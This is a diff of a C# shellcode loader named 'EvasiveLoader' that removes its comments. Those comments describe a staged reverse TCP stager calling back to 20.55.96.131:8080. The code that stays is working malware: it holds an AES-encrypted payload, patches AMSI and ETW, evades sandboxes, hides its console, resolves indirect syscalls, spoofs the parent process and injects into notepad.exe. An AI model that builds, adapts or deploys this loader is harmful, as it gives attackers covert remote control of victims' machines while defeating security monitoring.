@@ -4,41 +4,13 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-/*
- * Evasive AES-256-CBC Shellcode Loader - SILENT
- *
- * No terminal output. No debugging output. Console window hidden.
- *   - Compile with -target:winexe (GUI subsystem) so no console is created,
- *     AND calls ShowWindow(GetConsoleWindow(), SW_HIDE) for console builds.
- *   - All failure paths return silently.
- *
- * Functional fixes carried over from the original loader:
- *   1. STARTUPINFOEX used correctly (cb = sizeof(STARTUPINFOEX) = 112,
- *      attribute list in lpAttributeList, not lpReserved2).
- *   2. UpdateProcThreadAttribute gets a POINTER to the parent handle.
- *   3. Syscall stub failure falls back to direct ntdll P/Invoke.
- *   4. NtWriteVirtualMemory uses IntPtr (SIZE_T) for length/bytes-written.
- *   5. NtProtectVirtualMemory status checked (RW->RX).
- *   6. --skip-sandbox bypasses the sandbox/debugger check.
- *   7. Runtime x64 check.
- *
- * Payload: staged x64 reverse_tcp stager (staged, socket/connect/recv-based,
- * custom API hashing) -> 20.55.96.131:8080.
- * A matching handler (e.g., msfvenom multi/handler) must be running on that host/port.
- *
- * Build:
- *   mcs -target:winexe -platform:x64 -optimize+ -out:Loader_silent.exe Loader_silent.cs
- * Run:
- *   Loader_silent.exe [--skip-sandbox]
- */
+
 
 namespace EvasiveLoader
 {
     class Program
     {
-        // ─────────────────────────────────────────────
-        // EMBEDDED ENCRYPTED SHELLCODE + AES KEY / IV
-        // ─────────────────────────────────────────────
+   
         private static readonly byte[] EncryptedPayload = new byte[512] {
                 0x28, 0xA7, 0xDC, 0x64, 0x58, 0x08, 0xA8, 0x40, 0x5F, 0xD1, 0x57, 0x36, 0x6E, 0x82, 0x95, 0x2A,
                 0x46, 0x7F, 0xEA, 0xBA, 0xA3, 0x0B, 0x45, 0xCA, 0x14, 0x68, 0x24, 0xC1, 0x04, 0xF7, 0x15, 0x23,
@@ -83,9 +55,7 @@ namespace EvasiveLoader
                 0xBE, 0x93, 0xE3, 0x35, 0x3D, 0x57, 0x8F, 0x6B, 0x50, 0x8D, 0xC9, 0x47, 0x29, 0x03, 0x41, 0x94
         };
 
-        // ─────────────────────────────────────────────
-        // AES DECRYPTION
-        // ─────────────────────────────────────────────
+    
         private static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
         {
             using (Aes aes = Aes.Create())
@@ -100,9 +70,7 @@ namespace EvasiveLoader
             }
         }
 
-        // ─────────────────────────────────────────────
-        // PINVOKE / STRUCTS
-        // ─────────────────────────────────────────────
+
         [StructLayout(LayoutKind.Sequential)]
         struct PROCESS_INFORMATION
         {
@@ -135,7 +103,6 @@ namespace EvasiveLoader
             public IntPtr hStdError;
         }
 
-        // STARTUPINFOEX = STARTUPINFO (104 bytes on x64) + lpAttributeList at offset 104
         [StructLayout(LayoutKind.Sequential)]
         struct STARTUPINFOEX
         {
@@ -169,9 +136,7 @@ namespace EvasiveLoader
         const uint CREATE_SUSPENDED = 0x00000004;
         const int SW_HIDE = 0;
 
-        // ─────────────────────────────────────────────
-        // STANDARD PINVOKE FOR SETUP
-        // ─────────────────────────────────────────────
+      
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr GetModuleHandle(string lpModuleName);
 
@@ -214,9 +179,7 @@ namespace EvasiveLoader
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        // ─────────────────────────────────────────────
-        // DIRECT NTDLL PINVOKE (FALLBACK)
-        // ─────────────────────────────────────────────
+    
         [DllImport("ntdll.dll")]
         static extern uint NtAllocateVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
 
@@ -232,9 +195,7 @@ namespace EvasiveLoader
         [DllImport("ntdll.dll")]
         static extern uint NtResumeThreadFallback(IntPtr ThreadHandle, out uint SuspendCount);
 
-        // ─────────────────────────────────────────────
-        // INDIRECT SYSCALL DELEGATES
-        // ─────────────────────────────────────────────
+     
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
 
@@ -250,9 +211,7 @@ namespace EvasiveLoader
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         delegate uint NtResumeThreadDelegate(IntPtr ThreadHandle, out uint SuspendCount);
 
-        // ─────────────────────────────────────────────
-        // SYSCALL STUB RESOLVER
-        // ─────────────────────────────────────────────
+ 
         private static IntPtr GetSyscallStub(string functionName)
         {
             IntPtr ntdll = GetModuleHandle("ntdll.dll");
@@ -266,7 +225,6 @@ namespace EvasiveLoader
             byte[] stub = new byte[24];
             Marshal.Copy(funcAddr, stub, 0, stub.Length);
 
-            // x64 stub pattern: mov r10, rcx (4C 8B D1); mov eax, SSN (B8 ..)
             if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1 || stub[3] != 0xB8)
                 return IntPtr.Zero;
 
@@ -287,9 +245,7 @@ namespace EvasiveLoader
             return stubAddr;
         }
 
-        // ─────────────────────────────────────────────
-        // AMSI PATCH
-        // ─────────────────────────────────────────────
+  
         private static void PatchAmsi()
         {
             IntPtr amsi = GetModuleHandle("amsi.dll");
@@ -301,8 +257,8 @@ namespace EvasiveLoader
                 return;
 
             byte[] patch = Environment.Is64BitProcess
-                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }                 // mov eax, 0x80070057; ret
-                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };    // mov eax, 0x80070057; ret 0x18
+                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }                
+                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };    
 
             uint old;
             VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
@@ -310,9 +266,7 @@ namespace EvasiveLoader
             VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, old, out _);
         }
 
-        // ─────────────────────────────────────────────
-        // ETW PATCH
-        // ─────────────────────────────────────────────
+
         private static void PatchEtw()
         {
             IntPtr ntdll = GetModuleHandle("ntdll.dll");
@@ -324,8 +278,8 @@ namespace EvasiveLoader
                 return;
 
             byte[] patch = Environment.Is64BitProcess
-                ? new byte[] { 0xC3 }               // ret
-                : new byte[] { 0xC2, 0x14, 0x00 };  // ret 0x14
+                ? new byte[] { 0xC3 }              
+                : new byte[] { 0xC2, 0x14, 0x00 };  
 
             uint old;
             VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
@@ -333,9 +287,7 @@ namespace EvasiveLoader
             VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, old, out _);
         }
 
-        // ─────────────────────────────────────────────
-        // SANDBOX EVASION
-        // ─────────────────────────────────────────────
+    
         private static bool SandboxDetected()
         {
             if (IsDebuggerPresent())
@@ -357,9 +309,7 @@ namespace EvasiveLoader
             return false;
         }
 
-        // ─────────────────────────────────────────────
-        // CONSOLE HIDE
-        // ─────────────────────────────────────────────
+    
         private static void HideConsole()
         {
             IntPtr hWnd = GetConsoleWindow();
@@ -367,9 +317,7 @@ namespace EvasiveLoader
                 ShowWindow(hWnd, SW_HIDE);
         }
 
-        // ─────────────────────────────────────────────
-        // MAIN ENTRY POINT
-        // ─────────────────────────────────────────────
+   
         static void Main(string[] args)
         {
             HideConsole();
@@ -423,7 +371,6 @@ namespace EvasiveLoader
                 ? Marshal.GetDelegateForFunctionPointer<NtResumeThreadDelegate>(stubNtResume)
                 : (NtResumeThreadDelegate)NtResumeThreadFallback;
 
-            // ---- SPAWN TARGET PROCESS WITH PPID SPOOFING ----
             string targetProcess = @"C:\Windows\System32\notepad.exe";
 
             STARTUPINFOEX siEx = new STARTUPINFOEX();
@@ -518,7 +465,6 @@ namespace EvasiveLoader
             if (!created)
                 return;
 
-            // ---- INJECT SHELLCODE VIA SYSCALLS ----
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr regionSize = (IntPtr)shellcode.Length;
 
